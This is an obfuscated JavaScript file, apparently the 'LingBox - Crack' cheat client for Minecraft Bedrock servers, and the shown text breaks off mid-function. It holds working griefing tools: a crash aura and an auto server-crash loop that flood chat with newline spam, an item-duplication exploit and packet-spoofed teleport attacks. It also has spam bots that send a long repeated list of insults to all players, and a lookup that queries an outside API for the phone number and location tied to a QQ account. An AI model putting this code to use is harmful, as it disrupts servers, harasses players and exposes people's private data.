var 开关提示 = false;
var 自动刷屏 = false;
var 刷屏速度 = 0x1;
var 刷屏延迟 = 0x0;
var 刷屏后缀 = false;
var 刷屏内容 = 'LingBox - §cC§dr§ba§ec§uk§g nb';
var 刷屏提示 = 0x0;
var spyc = 0x0;
var spsz = 0x0;
const 刷屏设置 = '{"type": "custom_form","title": "刷屏设置","content": [{"type": "input","text": "输入内容","default": ""}]}';
var 崩溃光环 = false;
var 崩溃速度 = 0x1;
var 崩溃延迟 = 0x0;
var 崩溃范围 = 0x8;
var 崩溃光环提示 = 0x0;
var bkyc = 0x0;
var bkgh = '/tell @a[rm=0.1,r=' + 崩溃范围 + '] §k\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n§r';
var 崩溃光环范围崩溃 = true;
var 崩溃光环创造玩家 = false;
var 崩溃光环生存玩家 = false;
var 崩溃光环冒险玩家 = false;
var 崩溃光环全体玩家 = false;
var 崩溃光环旁观玩家 = false;
var 查看坐标 = false;
var 时 = 0x0;
var 分 = 0x0;
var 秒 = 0x0;
var 计秒 = 0x0;
var 使用时间 = true;
var 彩色入侵 = false;
var csrq = 0x0;
var 彩色入侵提示 = 0x0;
var 使用时间显示 = 0x0;
const player_name_list = getPlayerNameList();
const 伪造发言设置 = '{"type": "custom_form","title": "伪造发言","content": [{"type": "dropdown","text": "选择目标","options": ' + JSON['stringify'](player_name_list) + '},{"type": "input","text": "内容","default": ""}]}';
var 伪造发言目标;
var 伪造发言内容 = 0x29a;
var 伪造发言 = 0x0;
var 音效播放器 = false;
var 音效播放器速度 = 0x1;
var 音效播放器延迟 = 0x0;
var 音效播放器编号 = 0x0;
var 音效播放器音调 = -0x1;
var yxbfq = 0x0;
var 音效播放器提示 = 0x0;
var ypts = 0x0;
const 音效播放器设置 = '{"type": "custom_form","title": "音效播放器设置","content": [{"type": "input","text": "音效ID","default": ""},{"type": "input","text": "音调","default": "-1"}]}';
const 音效播放器一键配置 = '{"type": "form","title": "音效播放器配置","content": "选择一个配置","buttons": [{"text": "入侵号角"},{"text": "音爆"},{"text": "TNT爆炸"},{"text": "鬼叫"},{"text": "恐怖"}]}';
var 丢弃手持物品 = false;
var 丢弃手持物品速度 = 0x1;
var dqscwp = 0x0;
var 丢弃背包 = false;
var 丢弃背包速度 = 0x1;
var 丢弃背包延迟 = 0x0;
var 丢弃背包起始 = 0x0;
var 丢弃背包结束 = 0x23;
var 丢弃槽位 = 0x0;
var dqbb = 0x0;
var 丢弃背包提示 = 0x0;
var 槽位设置提示 = 0x0;
const 槽位设置 = '{"type": "custom_form","title": "槽位设置","content": [{"type": "input","text": "起始槽位","default": "0"},{"type": "input","text": "结束槽位","default": "35"},{"type": "label","text": "快捷栏槽位ID是 0到8"},{"type": "label","text": "背包槽位ID是 9到35"},{"type": "label","text": "起始槽位不要小于0或者大于结束槽位"}]}';
var 崩溃器 = false;
var 崩溃器数量 = 0x1;
var 崩溃器刷屏 = false;
var 崩溃器发包 = false;
var 崩溃器刷屏内容 = '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n';
var 崩溃器提示 = 0x0;
var 崩溃器拦截命令 = 0x0;
var 崩溃器刷屏拦截 = 0xc8;
var 无限夜视 = false;
var 无限夜视提示 = 0x0;
var 自动破坏 = false;
var 自动破坏大小 = 0x1;
var 自动破坏延迟 = 0x0;
var 自动破坏排除脚下 = false;
var zdph = 0x0;
var 自动破坏提示 = 0x0;
var 屏蔽掉落物 = false;
var 屏蔽掉落物提示 = 0x0;
var 定点随机传送 = false;
var 定点随机传送延迟 = 0x5;
var 定点随机传送高低 = 0x3;
var 定点随机传送范围 = 0x19;
var 定点随机传送x = 0x0;
var 定点随机传送y = 0x64;
var 定点随机传送z = 0x0;
var 定点随机传送xa = 0x0;
var 定点随机传送ya = 0x64;
var 定点随机传送za = 0x0;
var ddsjcs = 0x0;
var 定点随机传送提示 = 0x0;
var 定点随机传送提示a = 0x0;
const 定点随机传送坐标设置 = '{"type": "custom_form","title": "坐标设置","content": [{"type": "input","text": "坐标x","default": ""},{"type": "input","text": "坐标y","default": ""},{"type": "input","text": "坐标z","default": ""}]}';
var 入侵隐藏名字 = false;
var 入侵播放音效 = false;
var 入侵ycmz = '/me §k\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n§r';
var 入侵bfyx = 0x0;
var 陀螺 = false;
var 头部旋转 = false;
var 身体旋转 = true;
var 头部旋转速度 = 0x0;
var 身体旋转速度 = 0xa;
var 锁定头部 = false;
var 头部旋转sd = 0x0;
var 身体旋转sd = 0x0;
var 原地复活 = false;
var 原地复活玩家坐标 = [];
var 原地复活玩家属性 = [];
var 原地复活玩家血量 = 0x14;
var 原地复活x = 0x0;
var 原地复活y = 0x0;
var 原地复活z = 0x0;
var 复制物品 = 0x0;
var 复制物品a = 0x0;
var 音效 = false;
var 打击音效 = true;
var 放置音效 = false;
var 破坏音效 = false;
var ysid = getLocalPlayerUniqueID();
var 点击破坏 = false;
var 点击破坏大小 = 0x1;
var 自杀光环 = false;
var 锁定攻击 = false;
var 锁定攻击mb;
var 自动刷屏随机发言 = false;
var 自动崩服 = false;
const 自动崩服设置 = '{"type": "custom_form","title": "自动崩服","content": [{"type": "input","text": "崩服延迟","default": "400"},{"type": "input","text": "进服延迟","default": "1200"},{"type": "toggle","text": "刷屏","default": false},{"type": "input","text": "输入IP 端口","default": ""}]}';
var 自动崩服bf = 0x190;
var 自动崩服jf = 0x4b0;
var 自动崩服ip = '';
var 自动崩服sp = false;
var 自动崩服a = 0x0;
var 自动点击 = false;
var 自动点击延迟 = 0x0;
var 自动点击速度 = 0x1;
var 自动点击a = 0x0;
var 锁定攻击暗杀 = false;
var 锁定攻击y轴 = 0x3;
var 崩溃光环攻击崩溃 = false;
var 攻击干扰 = false;
var 卡住目标 = true;
var 辱骂目标 = false;
var 挥手修改 = false;
var 挥手速度 = 0x2;
var hseffect;
var _0x381671 = {};
_0x381671['id'] = 0x4;
_0x381671['duration'] = 0x0;
_0x381671['amplifier'] = 0x0;
_0x381671['displayOnScreenTextureAnimation'] = false;
_0x381671['noCounter'] = true;
var hsqeffect = _0x381671;
var _0x124d6d = {};
_0x124d6d['id'] = 0x3;
_0x124d6d['duration'] = 0x0;
_0x124d6d['amplifier'] = 0x0;
_0x124d6d['displayOnScreenTextureAnimation'] = false;
_0x124d6d['noCounter'] = true;
var hskeffect = _0x124d6d;
var 挥手修改a = 0x0;
const wb = ['密码币', '敲密码币', '密码思了', '泥拳甲私了', '飞舞东西', '肺雾玩意', '小学生', '乐子东西', '没脑子乐子', '煤木的估儿是不是', '我是你跌知道不', '能不能火速拷打我', '对面我行不行', '动不动', '对不对', '回答我', '是不是沙子', '怎么唯唯诺诺？', '为什么不还击', '面对我行不行', '为什么逃逸', '沉默是金了是不是', '在游戏里光宗耀祖了是不是', '朱苟不如Fvv', '无能无力了是不是', '沙子东西', '陶艺了是不是', '去自生自灭吧孩子', '无名小卒', '怎么语无伦次了', '拉击东西', '九年义务教育漏网之鱼', '乐子没自知之明是不是', '密码是不是五十包夜', '我经常看到密码麦币', '活着浪费空气，死了浪费土地', '老老实实回家种地吧', '你条野苟别出来咬人了', '丢人现眼', '手下败将', '没用的东西', '你在我这没画面', '滚去重开吧', '78玩意', '四目东西', '煤木估儿', '底层飞舞', '一辈子抬不起头', '不知天高地厚', '你跌我教你做人', '脑子辣密码币里了是不是', '无人在意你个估儿', '去翻字典了还是陶艺了', '一窍不通是不是', '为什么碰瓷你跌', '丑八怪', '傻孩子', '怎么慢悠悠了', '气急败坏', '笑死我了', '密码币', '敲密码币', '密码思了', '泥拳甲私了', '飞舞东西', '肺雾玩意', '小学生', '乐子东西', '没脑子乐子', '煤木的估儿是不是', '我是你跌知道不', '能不能火速拷打我', '对面我行不行', '动不动', '对不对', '回答我', '是不是沙子', '怎么唯唯诺诺？', '为什么不还击', '面对我行不行', '为什么逃逸', '沉默是金了是不是', '在游戏里光宗耀祖了是不是', '朱苟不如Fvv', '无能无力了是不是', '沙子东西', '陶艺了是不是', '去自生自灭吧孩子', '无名小卒', '怎么语无伦次了', '拉击东西', '九年义务教育漏网之鱼', '乐子没自知之明是不是', '密码是不是五十包夜', '我经常看到密码麦币', '活着浪费空气，死了浪费土地', '老老实实回家种地吧', '你条野苟别出来咬人了', '丢人现眼', '手下败将', '没用的东西', '你在我这没画面', '滚去重开吧', '78玩意', '四目东西', '煤木估儿', '底层飞舞', '一辈子抬不起头', '不知天高地厚', '你跌我教你做人', '脑子辣密码币里了是不是', '无人在意你个估儿', '去翻字典了还是陶艺了', '一窍不通是不是', '为什么碰瓷你跌', '丑八怪', '傻孩子', '怎么慢悠悠了', '气急败坏', '笑死我了', '密码币', '敲密码币', '密码思了', '泥拳甲私了', '飞舞东西', '肺雾玩意', '小学生', '乐子东西', '没脑子乐子', '煤木的估儿是不是', '我是你跌知道不', '能不能火速拷打我', '对面我行不行', '动不动', '对不对', '回答我', '是不是沙子', '怎么唯唯诺诺？', '为什么不还击', '面对我行不行', '为什么逃逸', '沉默是金了是不是', '在游戏里光宗耀祖了是不是', '朱苟不如Fvv', '无能无力了是不是', '沙子东西', '陶艺了是不是', '去自生自灭吧孩子', '无名小卒', '怎么语无伦次了', '拉击东西', '九年义务教育漏网之鱼', '乐子没自知之明是不是', '密码是不是五十包夜', '我经常看到密码麦币', '活着浪费空气，死了浪费土地', '老老实实回家种地吧', '你条野苟别出来咬人了', '丢人现眼', '手下败将', '没用的东西', '你在我这没画面', '滚去重开吧', '78玩意', '四目东西', '煤木估儿', '底层飞舞', '一辈子抬不起头', '不知天高地厚', '你跌我教你做人', '脑子辣密码币里了是不是', '无人在意你个估儿', '去翻字典了还是陶艺了', '一窍不通是不是', '为什么碰瓷你跌', '丑八怪', '傻孩子', '怎么慢悠悠了', '气急败坏', '笑死我了', '密码币', '敲密码币', '密码思了', '泥拳甲私了', '飞舞东西', '肺雾玩意', '小学生', '乐子东西', '没脑子乐子', '煤木的估儿是不是', '我是你跌知道不', '能不能火速拷打我', '对面我行不行', '动不动', '对不对', '回答我', '是不是沙子', '怎么唯唯诺诺？', '为什么不还击', '面对我行不行', '为什么逃逸', '沉默是金了是不是', '在游戏里光宗耀祖了是不是', '朱苟不如Fvv', '无能无力了是不是', '沙子东西', '陶艺了是不是', '去自生自灭吧孩子', '无名小卒', '怎么语无伦次了', '拉击东西', '九年义务教育漏网之鱼', '乐子没自知之明是不是', '密码是不是五十包夜', '我经常看到密码麦币', '活着浪费空气，死了浪费土地', '老老实实回家种地吧', '你条野苟别出来咬人了', '丢人现眼', '手下败将', '没用的东西', '你在我这没画面', '滚去重开吧', '78玩意', '四目东西', '煤木估儿', '底层飞舞', '一辈子抬不起头', '不知天高地厚', '你跌我教你做人', '脑子辣密码币里了是不是', '无人在意你个估儿', '去翻字典了还是陶艺了', '一窍不通是不是', '为什么碰瓷你跌', '丑八怪', '傻孩子', '怎么慢悠悠了', '气急败坏', '笑死我了'];
var 点击破坏连锁破坏 = false;
var 锁定攻击连击 = false;
var sdgja = 0x0;
const 颜色字符串 = ['§l§0', '§l§1', '§l§2', '§l§3', '§l§4', '§l§5', '§l§6', '§l§7', '§l§8', '§l§9', '§l§a', '§l§b', '§l§c', '§l§d', '§l§e', '§l§f', '§l§g', '§l§h', '§l§i', '§l§j', '§l§m', '§l§n', '§l§p', '§l§q', '§l§s', '§l§t', '§l§u'];
var 自动刷屏随机颜色 = false;
var spsjys = '';
var 一键扣字 = false;
var 一键扣字ys = false;
var 一键扣字msg = false;
var 一键扣字tell = false;
var 一键扣字me = false;
var 一键扣字颜色 = '';
var 一键扣字wb = '';
var 一键扣字延迟 = 0x0;
var 一键扣字yc = 0x0;
var 一键扣字速度 = 0x1;
var 自动破坏连锁破坏 = false;
var 自动破坏连锁破坏方块 = 'minecraft:air';
var 自动破坏连锁破坏方块a = 0x0;
var 自动挥手 = false;
var 自动跳跃 = false;
var q绑查询qq = '';
var q绑查询a = false;
var q绑yc = 0x0;
const custom_form = '{"type": "custom_form","title": "Q绑查询","content": [{"type": "input","text": "输入QQ号","default": ""}]}';
var 回城传送坐标x = 0x0;
var 回城传送坐标y = 0x0;
var 回城传送坐标z = 0x0;
var 回城传送坐标;
var 回城传送a = 0x0;
var 回城传送延迟 = 0x1;
var 回城传送yc = 0x0;
var csuid;
var csuzb;
var 受击回城 = false;
var 受击回城玩家属性;
var 受击回城玩家血量;
var 上帝模式 = false;
var 上帝模式水平传送 = false;
var 上帝模式垂直传送 = true;
var 上帝模式发包数量 = 0x5;
var 上帝模式距离 = 0x14;
var 百米目标 = 0x0;
var 世界玩家 = getWorldPlayerList();
var 百米延迟 = 0x0;
var 百米yc = 0x0;
var 百米大刀 = false;
var 百米距离 = 0xc8;

function 执行百米大刀() {
    if (百米大刀 == true) {
        if (百米yc >= 百米延迟) {
            let _0x2e5e02 = getLocalPlayerUniqueID();
            if (世界玩家[百米目标]['id'] != _0x2e5e02) {
                let _0x253ae1 = getEntityPos(世界玩家[百米目标]['id']);
                let _0x45802f = getEntityPos(_0x2e5e02);
                let _0x56e494 = Math['ceil'](_0x45802f['y']) - 0x2;
                let _0x1100d8 = 世界玩家[百米目标]['id'];
                let _0x4188aa = _0x253ae1['y'] - 0x2;
                let _0x135fd = 世界玩家[百米目标]['name'];
                var _0x17e1d5 = {};
                _0x17e1d5['x'] = _0x253ae1['x'];
                _0x17e1d5['y'] = _0x253ae1['y'];
                _0x17e1d5['z'] = _0x253ae1['z'];
                var _0x1f2171 = {};
                _0x1f2171['pos'] = _0x17e1d5;
                let _0x4268f1 = _0x1f2171;
                let _0x52251c = 百米距离 * 百米距离;
                const _0x4433d0 = _0x253ae1['x'] - _0x45802f['x'];
                const _0x4226b8 = _0x253ae1['y'] - _0x45802f['y'];
                const _0x1f8643 = _0x253ae1['z'] - _0x45802f['z'];
                const _0x5306fb = _0x4433d0 ** 0x2 + _0x4226b8 ** 0x2 + _0x1f8643 ** 0x2;
                if (_0x5306fb <= _0x52251c) {
                    showTipMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §b攻击目标: §f' + _0x135fd);
                    setEntityPos(_0x2e5e02, _0x253ae1['x'], _0x253ae1['y'], _0x253ae1['z']);
                    sendPlayerAuthInput(_0x4268f1);
                    attackEntity(_0x1100d8, true);
                    setEntityPos(_0x2e5e02, _0x45802f['x'], _0x56e494, _0x45802f['z']);
                }
            }
            百米目标++;
            百米yc = 0x0;
        }
        百米yc++;
        if (世界玩家[百米目标] == null) {
            百米目标 = 0x0;
            世界玩家 = getWorldPlayerList();
        }
    }
}
var 捡掉落物 = false;
var ccca = 0x0;
var ccclist = getEntityList();
var 捡掉落物yc = 0x0;
var 捡掉落物延迟 = 0x0;

function 执行捡掉落物() {
    if (捡掉落物 == true) {
        if (捡掉落物yc >= 捡掉落物延迟) {
            var _0xa2e4aa = getEntityNamespace(ccclist[ccca]);
            if (_0xa2e4aa == 'minecraft:item') {
                var _0x58eff3 = getEntityPos(ccclist[ccca]);
                var _0x94dd33 = _0x58eff3['y'] + 0x1;
                var _0x446f10 = {};
                _0x446f10['x'] = _0x58eff3['x'];
                _0x446f10['y'] = _0x94dd33;
                _0x446f10['z'] = _0x58eff3['z'];
                var _0x25e463 = {};
                _0x25e463['pos'] = _0x446f10;
                var _0x1a00ea = _0x25e463;
                for (var _0x1c90ca = 0x0; _0x1c90ca < 0x6; _0x1c90ca++) {
                    sendPlayerAuthInput(_0x1a00ea);
                }
            }
            ccca++;
        }
        捡掉落物yc++;
        if (ccclist[ccca] == null) {
            ccclist = getEntityList();
            ccca = 0x0;
        }
    }
}

function 执行上帝模式() {
    if (上帝模式 == true) {
        var _0x4e3efb = getEntityPos(getLocalPlayerUniqueID());
        if (上帝模式垂直传送 == true) {
            _0x4e3efb['y'] = _0x4e3efb['y'] + 上帝模式距离 * 0xa;
        }
        if (上帝模式水平传送 == true) {
            _0x4e3efb['x'] = _0x4e3efb['x'] + 上帝模式距离 * 0xa;
        }
        var _0x51ee3b = {};
        _0x51ee3b['x'] = _0x4e3efb['x'];
        _0x51ee3b['y'] = _0x4e3efb['y'];
        _0x51ee3b['z'] = _0x4e3efb['z'];
        var _0x156e59 = {};
        _0x156e59['pos'] = _0x51ee3b;
        var _0x15f774 = _0x156e59;
        for (var _0xe0d1f5 = 0x0; _0xe0d1f5 <= 上帝模式发包数量; _0xe0d1f5++) {
            sendPlayerAuthInput(_0x15f774);
        }
    }
}

function 执行回城传送() {
    if (回城传送a == 0x1) {
        if (回城传送yc == 0x0) {
            csuid = getLocalPlayerUniqueID();
            csuzb = getEntityPos(csuid);
            setEntityPos(csuid, 回城传送坐标['x'], 回城传送坐标['y'], 回城传送坐标['z']);
        }
        if (回城传送yc >= 回城传送延迟) {
            var _0x49b6b9 = csuzb['y'] - 0x1;
            setEntityPos(csuid, csuzb['x'], _0x49b6b9, csuzb['z']);
            回城传送a = 0x0;
            回城传送yc = -0x1;
        }
        回城传送yc++;
    }
    if (受击回城 == true) {
        if (受击回城玩家血量 <= 0xa) {
            回城传送a = 0x1;
        }
        受击回城玩家属性 = getEntityAttribute(getLocalPlayerUniqueID(), 'minecraft:health');
        受击回城玩家血量 = 受击回城玩家属性['current'];
    }
}

function 执行q绑查询() {
    if (q绑查询a == true) {
        let _0x14248f = 'https://zy.xywlapi.cc/qqapi?qq=' + q绑查询qq;
        curl_get(_0x14248f, {}, function(_0x1026d3, _0x37471e) {
            var _0xb226d8 = JSON['parse'](_0x37471e);
            if (_0xb226d8['status'] == '500') {
                clientMessage('查询失败 没有找到');
            }
            if (_0xb226d8['status'] == '200') {
                if (q绑yc == 0x0) {
                    clientMessage(_0xb226d8['message']);
                    clientMessage('QQ号: ' + _0xb226d8['qq']);
                    clientMessage('手机号: ' + _0xb226d8['phone']);
                    clientMessage('归属地: ' + _0xb226d8['phonediqu']);
                }
            }
        });
        q绑查询a = false;
    }
}

function 执行自动跳跃() {
    if (自动跳跃 == true) {
        playerJump();
    }
}

function 执行自动挥手() {
    if (自动挥手 == true) {
        swingArm();
    }
}

function 执行一键扣字() {
    if (一键扣字 == true) {
        if (一键扣字yc >= 一键扣字延迟) {
            for (var _0x57df68 = 0x0; _0x57df68 < 一键扣字速度; _0x57df68++) {
                if (一键扣字ys == true) {
                    一键扣字颜色 = getRandomMessageabc(颜色字符串);
                } else if (一键扣字 == false) {
                    一键扣字颜色 = '';
                }
                if (一键扣字msg) {
                    一键扣字wb = getRandomMessage(wb);
                    sendChatMessage(一键扣字颜色 + 一键扣字wb);
                }
                if (一键扣字tell) {
                    一键扣字wb = getRandomMessage(wb);
                    executeCommand('/tell @a ' + 一键扣字颜色 + 一键扣字wb);
                }
                if (一键扣字me) {
                    一键扣字wb = getRandomMessage(wb);
                    executeCommand('/me ' + 一键扣字颜色 + 一键扣字wb);
                }
            }
            一键扣字yc = 0x0;
        }
        一键扣字yc++;
    }
}

function getRandomMessageabc(_0x4d8951) {
    const _0x13c7d1 = Math['floor'](Math['random']() * _0x4d8951['length']);
    return _0x4d8951[_0x13c7d1];
}

function getRandomMessage(_0x2e17f4) {
    const _0x578878 = Math['floor'](Math['random']() * _0x2e17f4['length']);
    return _0x2e17f4[_0x578878];
}

function 执行挥手修改() {
    if (挥手修改 == true) {
        if (挥手速度 == 0x0) {
            var _0x43bee7 = {};
            _0x43bee7['id'] = 0x4;
            _0x43bee7['duration'] = 0x7d2b7500;
            _0x43bee7['amplifier'] = 0xff;
            _0x43bee7['displayOnScreenTextureAnimation'] = false;
            _0x43bee7['noCounter'] = true;
            hseffect = _0x43bee7;
            setEntityEffect(getLocalPlayerUniqueID(), hseffect);
        }
        if (挥手速度 >= 0x1 && 挥手速度 <= 0x2) {
            var _0x19145a = {};
            _0x19145a['id'] = 0x4;
            _0x19145a['duration'] = 0x7d2b7500;
            _0x19145a['amplifier'] = 0x5;
            _0x19145a['displayOnScreenTextureAnimation'] = false;
            _0x19145a['noCounter'] = true;
            hseffect = _0x19145a;
            setEntityEffect(getLocalPlayerUniqueID(), hseffect);
        }
        if (挥手速度 >= 0x3 && 挥手速度 <= 0x4) {
            var _0x2830f2 = {};
            _0x2830f2['id'] = 0x4;
            _0x2830f2['duration'] = 0x7d2b7500;
            _0x2830f2['amplifier'] = 0x4;
            _0x2830f2['displayOnScreenTextureAnimation'] = false;
            _0x2830f2['noCounter'] = true;
            hseffect = _0x2830f2;
            setEntityEffect(getLocalPlayerUniqueID(), hseffect);
        }
        if (挥手速度 >= 0x5 && 挥手速度 <= 0x6) {
            var _0x3b315b = {};
            _0x3b315b['id'] = 0x4;
            _0x3b315b['duration'] = 0x7d2b7500;
            _0x3b315b['amplifier'] = 0x3;
            _0x3b315b['displayOnScreenTextureAnimation'] = false;
            _0x3b315b['noCounter'] = true;
            hseffect = _0x3b315b;
            setEntityEffect(getLocalPlayerUniqueID(), hseffect);
        }
        if (挥手速度 >= 0x7 && 挥手速度 <= 0x8) {
            var _0x5c1d5b = {};
            _0x5c1d5b['id'] = 0x4;
            _0x5c1d5b['duration'] = 0x7d2b7500;
            _0x5c1d5b['amplifier'] = 0x2;
            _0x5c1d5b['displayOnScreenTextureAnimation'] = false;
            _0x5c1d5b['noCounter'] = true;
            hseffect = _0x5c1d5b;
            setEntityEffect(getLocalPlayerUniqueID(), hseffect);
        }
        if (挥手速度 >= 0x9 && 挥手速度 <= 0xa) {
            var _0x14044f = {};
            _0x14044f['id'] = 0x4;
            _0x14044f['duration'] = 0x7d2b7500;
            _0x14044f['amplifier'] = 0x1;
            _0x14044f['displayOnScreenTextureAnimation'] = false;
            _0x14044f['noCounter'] = true;
            hseffect = _0x14044f;
            setEntityEffect(getLocalPlayerUniqueID(), hseffect);
        }
        if (挥手速度 >= 0xb && 挥手速度 <= 0xc) {
            var _0x45f7ed = {};
            _0x45f7ed['id'] = 0x4;
            _0x45f7ed['duration'] = 0x7d2b7500;
            _0x45f7ed['amplifier'] = 0x0;
            _0x45f7ed['displayOnScreenTextureAnimation'] = false;
            _0x45f7ed['noCounter'] = true;
            hseffect = _0x45f7ed;
            setEntityEffect(getLocalPlayerUniqueID(), hseffect);
        }
        if (挥手速度 > 0xc) {
            setEntityEffect(getLocalPlayerUniqueID(), hsqeffect);
        }
        if (挥手速度 < 0xd) {
            setEntityEffect(getLocalPlayerUniqueID(), hskeffect);
        }
        if (挥手速度 >= 0xd && 挥手速度 <= 0xe) {
            var _0x61c74a = {};
            _0x61c74a['id'] = 0x3;
            _0x61c74a['duration'] = 0x7d2b7500;
            _0x61c74a['amplifier'] = 0x0;
            _0x61c74a['displayOnScreenTextureAnimation'] = false;
            _0x61c74a['noCounter'] = true;
            hseffect = _0x61c74a;
            setEntityEffect(getLocalPlayerUniqueID(), hseffect);
        }
        if (挥手速度 >= 0xf && 挥手速度 <= 0x10) {
            var _0x1a9154 = {};
            _0x1a9154['id'] = 0x3;
            _0x1a9154['duration'] = 0x7d2b7500;
            _0x1a9154['amplifier'] = 0x1;
            _0x1a9154['displayOnScreenTextureAnimation'] = false;
            _0x1a9154['noCounter'] = true;
            hseffect = _0x1a9154;
            setEntityEffect(getLocalPlayerUniqueID(), hseffect);
        }
        if (挥手速度 >= 0x11 && 挥手速度 <= 0x12) {
            var _0x455573 = {};
            _0x455573['id'] = 0x3;
            _0x455573['duration'] = 0x7d2b7500;
            _0x455573['amplifier'] = 0x2;
            _0x455573['displayOnScreenTextureAnimation'] = false;
            _0x455573['noCounter'] = true;
            hseffect = _0x455573;
            setEntityEffect(getLocalPlayerUniqueID(), hseffect);
        }
        if (挥手速度 >= 0x13 && 挥手速度 <= 0x14) {
            var _0x39e603 = {};
            _0x39e603['id'] = 0x3;
            _0x39e603['duration'] = 0x7d2b7500;
            _0x39e603['amplifier'] = 0x3;
            _0x39e603['displayOnScreenTextureAnimation'] = false;
            _0x39e603['noCounter'] = true;
            hseffect = _0x39e603;
            setEntityEffect(getLocalPlayerUniqueID(), hseffect);
        }
        if (挥手速度 >= 0x15 && 挥手速度 <= 0x16) {
            var _0x562947 = {};
            _0x562947['id'] = 0x3;
            _0x562947['duration'] = 0x7d2b7500;
            _0x562947['amplifier'] = 0x4;
            _0x562947['displayOnScreenTextureAnimation'] = false;
            _0x562947['noCounter'] = true;
            hseffect = _0x562947;
            setEntityEffect(getLocalPlayerUniqueID(), hseffect);
        }
        if (挥手速度 >= 0x17 && 挥手速度 <= 0x18) {
            var _0x32c559 = {};
            _0x32c559['id'] = 0x3;
            _0x32c559['duration'] = 0x7d2b7500;
            _0x32c559['amplifier'] = 0x5;
            _0x32c559['displayOnScreenTextureAnimation'] = false;
            _0x32c559['noCounter'] = true;
            hseffect = _0x32c559;
            setEntityEffect(getLocalPlayerUniqueID(), hseffect);
        }
        if (挥手速度 >= 0x19 && 挥手速度 <= 0x1a) {
            var _0x4ef2b0 = {};
            _0x4ef2b0['id'] = 0x3;
            _0x4ef2b0['duration'] = 0x7d2b7500;
            _0x4ef2b0['amplifier'] = 0xff;
            _0x4ef2b0['displayOnScreenTextureAnimation'] = false;
            _0x4ef2b0['noCounter'] = true;
            hseffect = _0x4ef2b0;
            setEntityEffect(getLocalPlayerUniqueID(), hseffect);
        }
        挥手修改a = 0x1;
    } else if (挥手修改 == false) {
        if (挥手修改a == 0x1) {
            setEntityEffect(getLocalPlayerUniqueID(), hsqeffect);
            setEntityEffect(getLocalPlayerUniqueID(), hskeffect);
            挥手修改a = 0x0;
        }
    }
}

function 执行自动点击() {
    if (自动点击 == true) {
        if (自动点击a >= 自动点击延迟) {
            for (var _0x2fdf85 = 0x0; _0x2fdf85 < 自动点击速度; _0x2fdf85++) {
                simulateClick();
            }
            自动点击a = 0x0;
        }
        自动点击a++;
    }
}

function 执行自动崩服() {
    if (自动崩服 == true) {
        if (自动崩服sp == true) {
            let _0x46bf62 = '\n';
            executeCommand('/me §k' + _0x46bf62['repeat'](0x1f4));
        }
        if (自动崩服a == 自动崩服bf) {
            buildBlock(getLocalPlayerUniqueID(), 0x0, 0x0, 0x0, 0x6);
            clientMessage('§l执行崩服');
        }
        if (自动崩服a > 自动崩服jf) {
            executeCommand('/ww server ' + 自动崩服ip);
            自动崩服a = 0x0;
        }
        自动崩服a++;
    }
}

function 执行自杀光环() {
    if (自杀光环 == true) {
        attackEntity(getLocalPlayerUniqueID(), true);
    }
}

function 执行锁定攻击() {
    if (锁定攻击 == true) {
        var _0x36a8cc = getEntityName(锁定攻击mb);
        var _0x54f076 = getEntityPos(锁定攻击mb);
        attackEntity(锁定攻击mb, true);
        showTipMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §b目标: §e' + _0x36a8cc);
        if (锁定攻击暗杀 == true) {
            _0x54f076['x'] = Math['ceil'](_0x54f076['x']) - 0x1;
            _0x54f076['z'] = Math['ceil'](_0x54f076['z']) - 0x1;
            _0x54f076['y'] = Math['ceil'](_0x54f076['y']) - 0x2 + 锁定攻击y轴;
            if (_0x54f076['x'] !== -0x1 && _0x54f076['y'] !== 0x3 && _0x54f076['z'] !== -0x1) {
                executeCommand('/ww tp ' + _0x54f076['x'] + ' ' + _0x54f076['y'] + ' ' + _0x54f076['z']);
            }
        }
    }
}

function 执行复制物品() {
    if (复制物品 == 0x1) {
        var _0x5aa7d2 = getLocalPlayerUniqueID();
        var _0x761d = getPlayerSelectItemSlot(_0x5aa7d2);
        if (复制物品a == 0x0) {
            clientMessage('§l执行复制物品');
            for (var _0x44a7e9 = 0x0; _0x44a7e9 < 0x40; _0x44a7e9++) {
                dropPlayerInventorySlot(_0x5aa7d2, _0x761d);
            }
        }
        复制物品a++;
        if (复制物品a == 0xa0) {
            buildBlock(_0x5aa7d2, 0x0, 0x0, 0x0, 0x6);
            clientMessage('§l复制物品');
        }
        if (复制物品a > 0xdc) {
            leaveWorld();
            showToast('执行完毕重新进入游戏');
            复制物品 = 0x0;
            复制物品a = 0x0;
        }
    }
}

function 执行原地复活() {
    if (原地复活 == true) {
        if (原地复活玩家血量 === 0x0) {
            executePluginCommand('/ww tp ' + 原地复活x + ' ' + 原地复活y + ' ' + 原地复活z);
        }
        原地复活玩家坐标 = getEntityPos(getLocalPlayerUniqueID());
        原地复活玩家属性 = getEntityAttribute(getLocalPlayerUniqueID(), 'minecraft:health');
        原地复活玩家血量 = 原地复活玩家属性['current'];
        原地复活x = 原地复活玩家坐标['x'];
        原地复活y = 原地复活玩家坐标['y'] - 0x2;
        原地复活z = 原地复活玩家坐标['z'];
    }
}

function 执行陀螺() {
    if (陀螺 == true) {
        if (头部旋转 == true) {
            头部旋转sd = 头部旋转sd + 头部旋转速度;
        }
        if (身体旋转 == true) {
            身体旋转sd = 身体旋转sd + 身体旋转速度;
        }
        if (锁定头部 == true) {
            头部旋转sd = 0x0;
        }
        setEntityRot(getLocalPlayerUniqueID(), 头部旋转sd, 身体旋转sd);
    }
}

function 执行定点随机传送() {
    if (定点随机传送 == true) {
        if (ddsjcs >= 定点随机传送延迟) {
            定点随机传送x = 定点随机传送xa + Math['floor'](Math['random']() * (定点随机传送范围 - -定点随机传送范围 + 0x1)) + -定点随机传送范围;
            定点随机传送y = 定点随机传送ya + Math['floor'](Math['random']() * (定点随机传送高低 - -定点随机传送高低 + 0x1)) + -定点随机传送高低;
            定点随机传送z = 定点随机传送za + Math['floor'](Math['random']() * (定点随机传送范围 - -定点随机传送范围 + 0x1)) + -定点随机传送范围;
            executeCommand('/ww tp ' + 定点随机传送x + ' ' + 定点随机传送y + ' ' + 定点随机传送z);
            ddsjcs = 0x0;
        }
        ddsjcs++;
        if (开关提示 == true) {
